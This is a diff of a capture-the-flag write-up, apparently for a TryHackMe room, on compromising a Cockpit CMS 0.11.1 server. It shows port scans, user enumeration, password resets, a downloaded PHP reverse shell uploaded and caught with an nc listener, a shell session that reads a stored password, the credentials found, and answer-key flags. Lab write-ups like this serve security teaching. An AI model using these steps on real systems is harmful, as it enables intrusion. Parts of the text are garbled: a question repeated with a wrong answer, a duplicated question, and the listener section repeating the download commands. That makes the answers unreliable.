@@ -12,12 +12,9 @@ Your mission is to exploit these vulnerabilities and compromise the web server.<
 <h4 align="left"> Answer the question below</h4>
 
 > 1.1. <em>What is the name of the Content Management System (CMS) installed on the server?</em><br><a id='1.1'></a>
->> <strong><code>_________</code></strong><br>
+>> <strong><code>cockpit</code></strong><br>
 <p></p>
 
-<br>
-
-<br>
 
 <h3>nmap</h3>
 <p>
@@ -31,7 +28,7 @@ Your mission is to exploit these vulnerabilities and compromise the web server.<
 
 
 ```bash
-:~# nmap -Pn -p- 10.10.72.83
+:~# nmap -Pn -p- TargetIP
 ...
 PORT   STATE SERVICE
 22/tcp open  ssh
@@ -39,7 +36,7 @@ PORT   STATE SERVICE
 ```
 
 ```bash
-:~# nmap -sC -sV -p- 10.10.72.83
+:~# nmap -sC -sV -p- TargetIP
 ...
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
@@ -54,14 +51,12 @@ PORT   STATE SERVICE VERSION
 ```
 
 ```bash
-:~# nmap -A -Pn -p- 10.10.72.83
+:~# nmap -A -Pn -p- TargetIP
 ...
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
 | ssh-hostkey: 
-|   2048 7f:25:f9:40:23:25:cd:29:8b:28:a9:d9:82:f5:49:e4 (RSA)
-|   256 0a:f4:29:ed:55:43:19:e7:73:a7:09:79:30:a8:49:1b (ECDSA)
-|_  256 2f:43:ad:a3:d1:5b:64:86:33:07:5d:94:f9:dc:a4:01 (ED25519)
+...
 80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
 |_http-server-header: Apache/2.4.18 (Ubuntu)
 | http-title: Authenticate Please!
@@ -80,7 +75,7 @@ PORT   STATE SERVICE VERSION
 
 
 ```bash
-:~# rustscan -a 10.10.72.83 --ulimit 5500 -b 65535 -- -A -Pn
+:~# rustscan -a TargetIP --ulimit 5500 -b 65535 -- -A -Pn
 ...
 PORT   STATE SERVICE REASON  VERSION
 22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
@@ -102,9 +97,24 @@ PORT   STATE SERVICE REASON  VERSION
 ...
 ```
 
+<br>
+
 <h3><code>http://TargetIP</code> redirects to <code>http://TargetIP/auth/login?to=/</code></h3>
 
 ![image](https://github.com/user-attachments/assets/c3c29bfb-03ae-4b6e-908a-0ad19033dde1)
+
+<br>
+<br>
+
+> 1.2. <em>What is the version of the Content Management System (CMS) installed on the server?</em><br><a id='1.2'></a>
+>> <strong><code>0.11.1</code></strong><br>
+<p></p>
+
+<br>
+
+> 1.3. <em>What is the path that allow user enumeration?</em><br><a id='1.3'></a>
+>> <strong><code>0.11.1</code></strong><br>
+<p></p>
 
 <p>Identified in page source ...</p>
 
@@ -151,6 +161,13 @@ App.request('/auth/check', {
 
 ![image](https://github.com/user-attachments/assets/afa79251-5237-4caf-89f0-bca12b01d67e)
 
+<br>
+<br>
+
+> 1.3. <em>What is the path that allow user enumeration?</em><br><a id='1.3'></a>
+>> <strong><code>0.11.1</code></strong><br>
+<p></p>
+
 <h3>ExploitdB</h3>
 
 ![image](https://github.com/user-attachments/assets/e3d06c91-a4fe-47ec-85a7-be066ee95809)
@@ -163,6 +180,12 @@ App.request('/auth/check', {
 
 ![image](https://github.com/user-attachments/assets/c5b4249f-809e-4e80-b7e1-e100ef89fc15)
 
+<br>
+<br>
+
+> 1.4. <em>How many users can you identify when you reproduce the user enumeration attack?</em><br><a id='1.4'></a>
+>> <strong><code>4</code></strong><br>
+<p></p>
 
 <p><code>admin </code> : <code>$<#aV+G^4l</code></p>
 
@@ -205,8 +228,189 @@ App.request('/auth/check', {
 
 ![image](https://github.com/user-attachments/assets/8b4e59c5-6275-4466-90a2-efbe28407c66)
 
+<br>
+<br>
+
+> 1.5. <em>What is the path that allows you to change user account passwords?</em><br><a id='1.5'></a>
+>> <strong><code>/auth/resetpassword</code></strong><br>
+<p></p>
+
+<br>
+
+> 1.6. <em>Compromise the Content Management System (CMS). What is Skidy's email.</em><br><a id='1.6'></a>
+>> <strong><code>skidy@tryhackme.fakemail</code></strong><br>
+<p></p>
+
+<br>
+
+> 1.7. <em>Compromise the Content Management System (CMS). What is Skidy's email.</em><br><a id='1.7'></a>
+>> <strong><code>thm{f158bea70731c48b05657a02aaf955626d78e9fb}</code></strong><br>
+<p></p>
+
+<h3>/accounts</h3>
+
+![image](https://github.com/user-attachments/assets/e99edc48-7ded-4fe3-85ac-991f92c06ee3)
+
+<h3>//settings</h3>
+
+![image](https://github.com/user-attachments/assets/1d0965a9-af33-46e2-ac88-cd1cd2e6decc)
+
+<p><code>skidy</code> : <code>password</code></p>
+
+![image](https://github.com/user-attachments/assets/bb4bfb14-4abf-40a7-adbc-034cb3d8de96)
+
+
+![image](https://github.com/user-attachments/assets/e553bd38-c10a-41a1-b0b7-cd8d2db434d1)
+
+![image](https://github.com/user-attachments/assets/a5aeb7f2-8085-4a79-921b-99fda5fa0f06)
+
+![image](https://github.com/user-attachments/assets/02d120a1-be77-4173-b70f-56c5173e473e)
+
+![image](https://github.com/user-attachments/assets/c19b36e6-150b-4f37-8273-3e3e797c1948)
+
+![image](https://github.com/user-attachments/assets/9cb6fa19-34af-4218-98eb-bbcd9bb738f9)
+
+![image](https://github.com/user-attachments/assets/6371ab4c-5e3b-4b5d-a62b-287fb895ceff)
+
+
+<h3>reverse shell</h3>
 
 ```bash
-TargetIP olympus.thm
+:~# wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php
+...
+:~# mv php-reverse-shell.php rev.php
+...
 ```
+
+![image](https://github.com/user-attachments/assets/84b430fc-5b79-497c-ab1a-eb76c750a163)
+
+
+<h3listerner</h3>
+
+```bash
+:~# wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php
+...
+:~# mv php-reverse-shell.php rev.php
+...
+```
+
+<br>
+
+> 1.8. <em>Compromise the machine and enumerate collections in the document database installed in the server. What is the flag in the database?</em><br><a id='1.8'></a>
+>> <strong><code>thm{c3d1af8da23926a30b0c8f4d6ab71bf851754568}</code></strong><br>
+<p></p>
+
+<p>navigated to <code>http://TargetIP/rev.php</code></p>
+
+```bash
+:~# nc -nlvp 9001
+Listening on 0.0.0.0 9001
+...
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ which python3
+/usr/bin/python3
+$ python3 -c 'import pty;pty.spawn("/bin/bash")'
+www-data@ubuntu:/$ ^Z
+[2]+  Stopped                 nc -nlvp 9001
+:~# stty raw -echo; fg
+nc -nlvp 9001
+...
+www-data@ubuntu:/home/stux$ cat stux.txt
+cat: stux.txt: No such file or directory
+www-data@ubuntu:/home/stux$ cat user.txt
+cat: user.txt: Permission denied
+...
+www-data@ubuntu:/home$ cd stux
+www-data@ubuntu:/home/stux$ ls -lah 
+total 44K
+drwxr-xr-x 4 stux stux 4.0K May 22  2021 .
+drwxr-xr-x 3 root root 4.0K May 21  2021 ..
+-rw-r--r-- 1 root root   74 May 22  2021 .bash_history
+-rw-r--r-- 1 stux stux  220 May 21  2021 .bash_logout
+-rw-r--r-- 1 stux stux 3.7K May 21  2021 .bashrc
+drwx------ 2 stux stux 4.0K May 21  2021 .cache
+-rw-r--r-- 1 root root  429 May 21  2021 .dbshell
+-rwxrwxrwx 1 root root    0 May 21  2021 .mongorc.js
+drwxrwxr-x 2 stux stux 4.0K May 21  2021 .nano
+-rw-r--r-- 1 stux stux  655 May 21  2021 .profile
+-rw-r--r-- 1 stux stux    0 May 21  2021 .sudo_as_admin_successful
+-rw-r--r-- 1 root root  312 May 21  2021 .wget-hsts
+-rw------- 1 stux stux   46 May 22  2021 user.txt
+www-data@ubuntu:/home/stux$ 
+...
+www-data@ubuntu:/home/stux$ cat .dbshell
+show
+show dbs
+use admin
+use sudousersbak
+show dbs
+db.user.insert({name: "stux", name: "p4ssw0rdhack3d!123"})
+show dbs
+use sudousersbak
+show collections
+db
+show
+db.collectionName.find()
+show collections
+db.collection_name.find().pretty()
+db.user.find().pretty()
+db.user.insert({name: "stux"})
+db.user.find().pretty()
+db.flag.insert({name: "thm{c3d1af8da23926a30b0c8f4d6ab71bf851754568}"})
+show collections
+db.flag.find().pretty()
+www-data@ubuntu:/home/stux$ 
+
+www-data@ubuntu:/home/stux$ cd /var/www/html
+www-data@ubuntu:/var/www/html$ ls
+cockpit  index.html
+www-data@ubuntu:/var/www/html$ ls -lah
+total 24K
+drwxr-xr-x 3 root     root     4.0K May 21  2021 .
+drwxr-xr-x 3 root     root     4.0K May 21  2021 ..
+drwxr-xr-x 9 www-data www-data 4.0K Jun 18 12:36 cockpit
+-rw-r--r-- 1 root     root      12K May 21  2021 index.html
+www-data@ubuntu:/var/www/html$ cd cockpit
+www-data@ubuntu:/var/www/html/cockpit$ ls
+CONTRIBUTING.md  addons		cp	     lib	   storage
+Dockerfile	 assets		favicon.png  modules	   webflag.php
+LICENSE		 bootstrap.php	index.php    package.json
+README.md	 composer.json	install      rev.php
+www-data@ubuntu:/var/www/html/cockpit$ cd storage
+www-data@ubuntu:/var/www/html/cockpit/storage$ ls
+cache  data  thumbs  tmp  uploads
+www-data@ubuntu:/var/www/html/cockpit/storage$ cd data
+www-data@ubuntu:/var/www/html/cockpit/storage/data$ ls
+cockpit.memory.sqlite  cockpit.sqlite  cockpitdb.sqlite  index.html
+www-data@ubuntu:/var/www/html/cockpit/storage/data$ 
+```
+
+<br>
+
+> 1.9. <em>What is the user.txt flag??</em><br><a id='1.9'></a>
+>> <strong><code>thm{c5fc72c48759318c78ec88a786d7c213da05f0ce}</code></strong><br>
+<p></p>
+
+<p><code>stux</code> : <code>p4ssw0rdhack3d!123</code></p>
+
+```bash
+www-data@ubuntu:/home/stux$ su stux
+Password: 
+stux@ubuntu:~$ pwd
+/home/stux
+stux@ubuntu:~$ cat user.txt
+thm{c5fc72c48759318c78ec88a786d7c213da05f0ce}
+stux@ubuntu:~$ 
+```
+
+<br>
+
+
+
+<p>Logged in as <code>admin</code> again.<br>
+Navigated to <code>System</code> > <code>Accounts</code><br>
+Changed <code>darkStar7471</code>´s and <code>Ekoparty</code>´s passwords</p>
+
 
